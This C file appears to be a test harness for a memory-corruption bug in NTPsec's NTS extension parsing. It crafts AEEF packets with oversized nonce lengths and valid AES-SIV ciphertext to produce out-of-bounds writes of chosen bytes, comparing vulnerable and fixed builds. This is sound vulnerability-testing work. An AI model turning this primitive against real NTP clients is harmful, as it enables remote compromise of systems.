/*
 * ntpsec2shell harness driver. The parsed function comes from fn.inc, which
 * gen.py copies byte-for-byte from a pinned NTPsec tag. Everything else here
 * is a local stub: structs, counters, packet construction and the decrypt
 * consumer. In the stub build AES_SIV_Decrypt is a modeled consumer that writes
 * chosen bytes; in REAL_CRYPTO the pinned libaes_siv implementation is linked.
 */
#include <arpa/inet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "aes_siv.h"

#define LEN_PKT_NOMAC 48
#define NTS_KE_HDR_LNG 4
#define NTS_KE_U16_LNG 2
#define NTP_EX_HDR_LNG 4
#define NTS_CRITICAL 0x8000
#define NTP_EX_U16_LNG 2
#define Unique_Identifier 0x104
#define NTS_Cookie 0x204
#define NTS_AEEF 0x404
#define NTS_UID_LENGTH 32
#define NTS_MAX_COOKIES 8

struct BufCtl_t {
	uint8_t *next;
	int left;
};
typedef struct BufCtl_t BufCtl;

struct peer_nts {
	uint8_t UID[NTS_UID_LENGTH];
	uint8_t cookies[NTS_MAX_COOKIES][128];
	int cookielen, writeIdx, count;
	uint8_t s2c[64];
	int keylen;
};
struct peer { struct peer_nts nts_state; };
struct nts_counters { int client_recv_bad, client_recv_good; };

static struct peer the_peer;
struct nts_counters nts_cnt;
AES_SIV_CTX *wire_ctx = NULL;
static uint8_t stub_fill;
static uint8_t *stub_out;
static size_t stub_written;

#ifndef REAL_CRYPTO
int AES_SIV_Decrypt(AES_SIV_CTX *ctx, uint8_t *out, size_t *out_len,
		     const uint8_t *key, size_t key_len,
		     const uint8_t *nonce, size_t nonce_len,
		     const uint8_t *ciphertext, size_t ciphertext_len,
		     const uint8_t *ad, size_t ad_len) {
	(void)ctx; (void)key; (void)key_len; (void)ciphertext;
	(void)ciphertext_len; (void)ad; (void)ad_len;
	stub_out = out;
	stub_written = *out_len;
	memset(out, stub_fill, *out_len);
	return 1;
}
#else
int libaes_siv_Decrypt(AES_SIV_CTX *ctx, uint8_t *out, size_t *out_len,
		       const uint8_t *key, size_t key_len,
		       const uint8_t *nonce, size_t nonce_len,
		       const uint8_t *ciphertext, size_t ciphertext_len,
		       const uint8_t *ad, size_t ad_len);
int AES_SIV_Decrypt(AES_SIV_CTX *ctx, uint8_t *out, size_t *out_len,
		    const uint8_t *key, size_t key_len,
		    const uint8_t *nonce, size_t nonce_len,
		    const uint8_t *ciphertext, size_t ciphertext_len,
		    const uint8_t *ad, size_t ad_len) {
	return libaes_siv_Decrypt(ctx, out, out_len, key, key_len, nonce,
				  nonce_len, ciphertext, ciphertext_len, ad, ad_len);
}
#endif

#include "fn.inc"

static void put16(uint8_t *p, unsigned v) {
	p[0] = (uint8_t)(v >> 8);
	p[1] = (uint8_t)v;
}

static void print_bytes(const char *label, int n, uint8_t *p) {
	if (label[0]) printf("%s=", label);
	for (int i = 0; i < n; i++) printf("%02x", p[i]);
	printf("\n");
}

/* Stub-consumer case: exact-sized packet allocation, crafted AEEF record. */
static int stub_case(int noncelen, uint8_t fill, const char *name) {
	const int plen = 128;
#ifdef SLACK
	uint8_t *pkt = malloc(plen + 128);
#else
	uint8_t *pkt = malloc(plen);
#endif
	memset(pkt, 0, plen);
	put16(pkt + 48, NTS_AEEF);
	put16(pkt + 50, plen - LEN_PKT_NOMAC);	/* whole extension body */
	put16(pkt + 52, (unsigned)noncelen);
	put16(pkt + 54, 16);
	memset(pkt + 56, 0x11, 16);
	stub_fill = fill;
	stub_out = NULL;
	stub_written = 0;
	memset(&the_peer, 0, sizeof the_peer);
	memset(&nts_cnt, 0, sizeof nts_cnt);
	bool ok = extens_client_recv(&the_peer, pkt, plen);
	long off = stub_out ? (long)(stub_out - pkt) : -1;
	printf("CASE=%s FN_RC=%d WRITE_OFF=%ld WRITE_LEN=%zu BYTES=",
	       name, ok ? 1 : 0, off, stub_written);
	if (stub_out && stub_written) {
		int n = stub_written < 16 ? (int)stub_written : 16;
		for (int i = 0; i < n; i++) printf("%02x", stub_out[i]);
	}
	printf("\n");
	fflush(stdout);
	free(pkt);
	return ok ? 0 : 1;
}

/* Real-crypto case: large recv buffer, short declared datagram, valid
 * AES-SIV ciphertext placed beyond the declared extension. */
static int real_case(const char *name) {
	const int cap = 1024, lng = 104, noncelen = 256;
	uint8_t *buf = malloc(cap);
	uint8_t key[64], chosen[16], cbuf[64], ad[48];
	size_t clen = sizeof cbuf, olen;
	memset(buf, 0x11, cap);
	memset(key, 0x22, sizeof key);
	for (int i = 0; i < 16; i++) chosen[i] = (uint8_t)(0x41 + i);
	memcpy(ad, buf, sizeof ad);
	put16(buf + 48, NTS_AEEF);
	put16(buf + 50, lng - LEN_PKT_NOMAC);
	put16(buf + 52, noncelen);
	put16(buf + 54, 16);
	AES_SIV_CTX *enc = AES_SIV_CTX_new();
	if (!enc || !AES_SIV_Init(enc, key, sizeof key)) return 9;
	if (!AES_SIV_Encrypt(enc, cbuf, &clen, key, sizeof key,
			     buf + 56, noncelen, chosen, sizeof chosen,
			     ad, sizeof ad)) return 9;
	memset(buf + 72 + noncelen, 0xcc, 16);	/* fixed-pin marker */
	memcpy(buf + 56 + noncelen, cbuf, clen);	/* valid ciphertext + SIV */
	fprintf(stderr, "ENC_CLEN=%zu ENC_PAYLOAD=", clen);
	for (int i = 16; i < 32; i++) fprintf(stderr, "%02x", cbuf[i]);
	fprintf(stderr, "\n");
	memset(&the_peer, 0, sizeof the_peer);
	memset(&nts_cnt, 0, sizeof nts_cnt);
	memcpy(the_peer.nts_state.s2c, key, sizeof key);
	the_peer.nts_state.keylen = (int)sizeof key;
	wire_ctx = AES_SIV_CTX_new();
	if (!wire_ctx || !AES_SIV_Init(wire_ctx, key, sizeof key)) return 9;
	olen = 0;
	(void)olen;
	bool ok = extens_client_recv(&the_peer, buf, lng);
	fprintf(stderr, "DEC_PATH=%s\n",
		((const uint8_t *)buf)[72 + noncelen] == 0xcc ? "cc" : "changed");
	printf("CASE=%s FN_RC=%d PLAIN_OFF=%d PLAIN=", name, ok ? 1 : 0,
	       72 + noncelen);
	print_bytes("", 16, buf + 72 + noncelen);
	fflush(stdout);
	AES_SIV_CTX_free(enc);
	AES_SIV_CTX_free(wire_ctx);
	free(buf);
	return ok ? 0 : 1;
}

int main(int argc, char **argv) {
	if (argc != 2) return 2;
	const char *c = argv[1];
	if (!strcmp(c, "stub-vuln-n64-41")) return stub_case(64, 0x41, c);
	if (!strcmp(c, "stub-vuln-n64-5a")) return stub_case(64, 0x5a, c);
	if (!strcmp(c, "stub-vuln-n16-41")) return stub_case(16, 0x41, c);
	if (!strcmp(c, "stub-fixed-n64-41")) return stub_case(64, 0x41, c);
	if (!strcmp(c, "stub-fixed-n16-41")) return stub_case(16, 0x41, c);
	if (!strcmp(c, "real-vuln")) return real_case(c);
	if (!strcmp(c, "real-fixed")) return real_case(c);
	return 2;
}
